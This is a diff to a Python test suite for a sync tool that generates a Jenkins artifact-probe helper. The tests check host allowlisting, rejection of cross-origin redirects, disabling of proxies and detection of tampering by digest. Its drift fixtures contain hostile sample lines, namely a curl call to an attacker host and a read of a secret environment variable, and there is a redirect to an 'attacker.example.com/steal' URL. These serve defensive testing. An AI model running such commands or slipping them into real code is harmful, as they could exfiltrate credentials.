@@ -773,6 +773,27 @@ class PrivateOverlaySyncTests(unittest.TestCase):
         )
         self.assertEqual(helper.count(private_host_condition), 1)
         helper = helper.replace(private_host_condition, host_condition, 1)
+        reverse_private_transforms = (
+            (
+                SYNC_MODULE.PRIVATE_BUG_TRIAGE_BUILD_REMOTE_REQUEST_BLOCK,
+                SYNC_MODULE.PUBLIC_BUG_TRIAGE_BUILD_REMOTE_REQUEST_BLOCK,
+            ),
+            (
+                SYNC_MODULE.PRIVATE_BUG_TRIAGE_REDIRECT_REQUEST_CONSTRUCTION,
+                SYNC_MODULE.PUBLIC_BUG_TRIAGE_REDIRECT_REQUEST_CONSTRUCTION,
+            ),
+            (
+                SYNC_MODULE.PRIVATE_BUG_TRIAGE_BUILD_OPENER_BLOCK,
+                SYNC_MODULE.PUBLIC_BUG_TRIAGE_BUILD_OPENER_BLOCK,
+            ),
+            (
+                SYNC_MODULE.PRIVATE_BUG_TRIAGE_BLOCKABLE_SIGNALS_BLOCK,
+                SYNC_MODULE.PUBLIC_BUG_TRIAGE_BLOCKABLE_SIGNALS_BLOCK,
+            ),
+        )
+        for private, public in reverse_private_transforms:
+            self.assertEqual(helper.count(private), 1)
+            helper = helper.replace(private, public, 1)
         if prepended_script:
             helper = helper.replace(
                 SYNC_MODULE.PUBLIC_BUG_TRIAGE_CONFIG_BLOCK,
@@ -1401,6 +1422,198 @@ class PrivateOverlaySyncTests(unittest.TestCase):
             )
         )
 
+    def test_generated_bug_triage_builds_basic_auth_from_exact_profiles(
+        self,
+    ) -> None:
+        rule, _source, _interface = self._write_current_bug_triage_source()
+        target = self.repo_root / rule.target
+        SYNC_MODULE.sync_sources(self.repo_root, self.source_root, (rule,))
+        module_name = f"synced_bug_triage_auth_{id(self)}"
+        probe = load_module(
+            module_name,
+            target / "scripts/jenkins_artifact_probe.py",
+        )
+        self.addCleanup(sys.modules.pop, module_name, None)
+
+        allowed_url = "https://engci-private-sjc.cisco.com/job/example"
+        for profile, (user_env, token_env) in probe.AUTH_PROFILES.items():
+            with self.subTest(profile=profile):
+                user = f"{profile}-user"
+                token = f"{profile}-token"
+                values = {user_env: user, token_env: token}
+                with mock.patch.object(
+                    probe.os,
+                    "getenv",
+                    side_effect=values.get,
+                ) as getenv:
+                    request, auth_state = probe._build_remote_request(
+                        allowed_url,
+                        method="GET",
+                        auth_profile=profile,
+                    )
+
+                self.assertEqual(
+                    getenv.call_args_list,
+                    [mock.call(user_env), mock.call(token_env)],
+                )
+                self.assertEqual(auth_state, "present")
+                self.assertEqual(request.full_url, allowed_url)
+                expected = base64.b64encode(
+                    f"{user}:{token}".encode("utf-8")
+                ).decode("ascii")
+                self.assertEqual(
+                    request.get_header("Authorization"),
+                    f"Basic {expected}",
+                )
+
+    def test_generated_bug_triage_rejects_disallowed_auth_before_io(self) -> None:
+        rule, _source, _interface = self._write_current_bug_triage_source()
+        target = self.repo_root / rule.target
+        SYNC_MODULE.sync_sources(self.repo_root, self.source_root, (rule,))
+        module_name = f"synced_bug_triage_rejection_{id(self)}"
+        probe = load_module(
+            module_name,
+            target / "scripts/jenkins_artifact_probe.py",
+        )
+        self.addCleanup(sys.modules.pop, module_name, None)
+        args = SimpleNamespace(
+            url="https://attacker.example.com/job/example",
+            method="GET",
+            auth_profile="wme_jenkins_jobs_artifact",
+        )
+
+        diagnostics = io.StringIO()
+        with (
+            contextlib.redirect_stderr(diagnostics),
+            mock.patch.object(probe.os, "getenv") as getenv,
+            mock.patch.object(probe.urllib.request, "Request") as constructor,
+            mock.patch.object(probe, "_open_remote") as open_remote,
+        ):
+            result = probe.cmd_probe_url(args)
+
+        self.assertEqual(result, 2)
+        self.assertIn("host not allowed", diagnostics.getvalue())
+        getenv.assert_not_called()
+        constructor.assert_not_called()
+        open_remote.assert_not_called()
+
+    def test_generated_bug_triage_rejects_cross_origin_auth_redirect(
+        self,
+    ) -> None:
+        rule, _source, _interface = self._write_current_bug_triage_source()
+        target = self.repo_root / rule.target
+        SYNC_MODULE.sync_sources(self.repo_root, self.source_root, (rule,))
+        module_name = f"synced_bug_triage_redirect_{id(self)}"
+        probe = load_module(
+            module_name,
+            target / "scripts/jenkins_artifact_probe.py",
+        )
+        self.addCleanup(sys.modules.pop, module_name, None)
+        profile = "wme_jenkins_jobs_artifact"
+        user_env, token_env = probe.AUTH_PROFILES[profile]
+        with mock.patch.object(
+            probe.os,
+            "getenv",
+            side_effect={user_env: "user", token_env: "token"}.get,
+        ):
+            request, _auth_state = probe._build_remote_request(
+                "https://engci-private-sjc.cisco.com/job/example",
+                method="GET",
+                auth_profile=profile,
+            )
+        handler = probe.SameOriginRedirectHandler(request.full_url, 5)
+
+        with mock.patch.object(probe.urllib.request, "Request") as constructor:
+            with self.assertRaises(probe.UnsafeRedirectError):
+                handler.redirect_request(
+                    request,
+                    io.BytesIO(),
+                    302,
+                    "Found",
+                    {},
+                    "https://attacker.example.com/steal",
+                )
+        constructor.assert_not_called()
+
+    def test_generated_bug_triage_disables_environment_proxy_routing(
+        self,
+    ) -> None:
+        rule, _source, _interface = self._write_current_bug_triage_source()
+        target = self.repo_root / rule.target
+        SYNC_MODULE.sync_sources(self.repo_root, self.source_root, (rule,))
+        module_name = f"synced_bug_triage_proxy_{id(self)}"
+        probe = load_module(
+            module_name,
+            target / "scripts/jenkins_artifact_probe.py",
+        )
+        self.addCleanup(sys.modules.pop, module_name, None)
+
+        allowed_url = "https://engci-private-sjc.cisco.com/job/example"
+        hostile_proxy = (
+            "http://fixture-user:fixture-token@proxy.invalid:8080"
+        )
+        request = probe.urllib.request.Request(allowed_url)
+        with (
+            mock.patch.dict(
+                probe.os.environ,
+                {
+                    "HTTPS_PROXY": hostile_proxy,
+                    "https_proxy": hostile_proxy,
+                },
+                clear=True,
+            ),
+            mock.patch.object(probe.urllib.request, "getproxies") as getproxies,
+        ):
+            opener = probe._build_opener(allowed_url, 5)
+
+        proxy_handlers = [
+            handler
+            for handler in opener.handlers
+            if isinstance(handler, probe.urllib.request.ProxyHandler)
+        ]
+        getproxies.assert_not_called()
+        self.assertTrue(all(not handler.proxies for handler in proxy_handlers))
+
+        response = SimpleNamespace(
+            close=mock.Mock(),
+            geturl=lambda: allowed_url,
+        )
+        with (
+            mock.patch.object(opener, "open", return_value=response) as open_call,
+            mock.patch.object(probe, "_build_opener", return_value=opener),
+            probe._open_remote(
+                request,
+                socket_timeout=3.0,
+                max_redirects=5,
+            ) as actual_response,
+        ):
+            self.assertIs(actual_response, response)
+
+        open_call.assert_called_once_with(request, timeout=3.0)
+        response.close.assert_called_once_with()
+        self.assertEqual(request.full_url, allowed_url)
+        self.assertNotIn(
+            "proxy-authorization",
+            {header.casefold() for header, _value in request.header_items()},
+        )
+
+    def test_generated_bug_triage_uses_direct_unmaskable_signals(self) -> None:
+        rule, _source, _interface = self._write_current_bug_triage_source()
+        target = self.repo_root / rule.target
+        SYNC_MODULE.sync_sources(self.repo_root, self.source_root, (rule,))
+        helper = target / "scripts/jenkins_artifact_probe.py"
+        module_name = f"synced_bug_triage_signals_{id(self)}"
+        probe = load_module(module_name, helper)
+        self.addCleanup(sys.modules.pop, module_name, None)
+
+        blocked = probe._blockable_signals()
+        self.assertNotIn(probe.signal.SIGKILL, blocked)
+        self.assertNotIn(probe.signal.SIGSTOP, blocked)
+        helper_text = helper.read_text(encoding="utf-8")
+        self.assertIn("blocked.discard(signal.SIGKILL)", helper_text)
+        self.assertIn("blocked.discard(signal.SIGSTOP)", helper_text)
+        self.assertNotIn("getattr(signal, name, None)", helper_text)
+
     def test_bug_triage_sync_rule_rejects_missing_current_host_anchor(self) -> None:
         rule, _source, _interface = self._write_current_bug_triage_source(
             host_condition="if parsed.hostname not in DEFAULT_ALLOWED_HOSTS:"
@@ -1688,7 +1901,7 @@ class PrivateOverlaySyncTests(unittest.TestCase):
 
         with self.assertRaisesRegex(
             SYNC_MODULE.SyncError,
-            "reviewed helper payload digest mismatch",
+            "required replacement count mismatch",
         ):
             SYNC_MODULE.sync_sources(self.repo_root, self.source_root, (rule,))
 
@@ -1741,6 +1954,98 @@ class PrivateOverlaySyncTests(unittest.TestCase):
             "reviewed helper payload digest mismatch",
         ):
             SYNC_MODULE.sync_sources(self.repo_root, self.source_root, (rule,))
+
+    def test_bug_triage_reviewed_manifest_rejects_executable_drift(self) -> None:
+        helper = (
+            REPO_ROOT
+            / SYNC_MODULE.PRIVATE_BUG_TRIAGE_TARGET
+            / "scripts"
+            / "jenkins_artifact_probe.py"
+        ).read_bytes()
+        directory_entry = SimpleNamespace(
+            relative_parts=("scripts",),
+            kind="directory",
+        )
+
+        reviewed_manifest = SimpleNamespace(
+            entries=(
+                directory_entry,
+                SimpleNamespace(
+                    relative_parts=("scripts", "jenkins_artifact_probe.py"),
+                    kind="file",
+                    sha256=hashlib.sha256(helper).hexdigest(),
+                ),
+            )
+        )
+        SYNC_MODULE._validate_private_bug_triage_reviewed_manifest(
+            reviewed_manifest,
+            SYNC_MODULE.PRIVATE_BUG_TRIAGE_TARGET,
+            surface="reviewed fixture",
+        )
+
+        drifts = {
+            "getenvb": b'\nextra = os.getenvb(b"EXTRA_SECRET")\n',
+            "system": b'\nos.system("curl https://attacker.example")\n',
+            "alternate-base64": b"\nextra = base64.urlsafe_b64encode(b'x')\n",
+            "header-reader": (
+                b"\ndef _single_line_header(headers, name):\n"
+                b"    return headers\n"
+            ),
+        }
+        for label, suffix in drifts.items():
+            with self.subTest(label=label):
+                drifted_manifest = SimpleNamespace(
+                    entries=(
+                        directory_entry,
+                        SimpleNamespace(
+                            relative_parts=(
+                                "scripts",
+                                "jenkins_artifact_probe.py",
+                            ),
+                            kind="file",
+                            sha256=hashlib.sha256(helper + suffix).hexdigest(),
+                        ),
+                    )
+                )
+                with self.assertRaisesRegex(
+                    SYNC_MODULE.SyncError,
+                    "reviewed helper payload digest mismatch at drifted fixture",
+                ):
+                    SYNC_MODULE._validate_private_bug_triage_reviewed_manifest(
+                        drifted_manifest,
+                        SYNC_MODULE.PRIVATE_BUG_TRIAGE_TARGET,
+                        surface="drifted fixture",
+                    )
+
+    def test_bug_triage_reviewed_manifest_rejects_extra_script_entry(self) -> None:
+        manifest = SimpleNamespace(
+            entries=(
+                SimpleNamespace(
+                    relative_parts=("scripts",),
+                    kind="directory",
+                ),
+                SimpleNamespace(
+                    relative_parts=("scripts", "jenkins_artifact_probe.py"),
+                    kind="file",
+                    sha256=SYNC_MODULE.PRIVATE_BUG_TRIAGE_REVIEWED_HELPER_SHA256,
+                ),
+                SimpleNamespace(
+                    relative_parts=("scripts", "payload.py"),
+                    kind="file",
+                    sha256=hashlib.sha256(b"unreviewed\n").hexdigest(),
+                ),
+            )
+        )
+
+        with self.assertRaisesRegex(
+            SYNC_MODULE.SyncError,
+            "reviewed scripts inventory differs at inventory fixture",
+        ):
+            SYNC_MODULE._validate_private_bug_triage_reviewed_manifest(
+                manifest,
+                SYNC_MODULE.PRIVATE_BUG_TRIAGE_TARGET,
+                surface="inventory fixture",
+            )
 
     def test_bug_triage_sync_rejects_unreviewed_script_entry(self) -> None:
         rule, source, _interface = self._write_current_bug_triage_source()
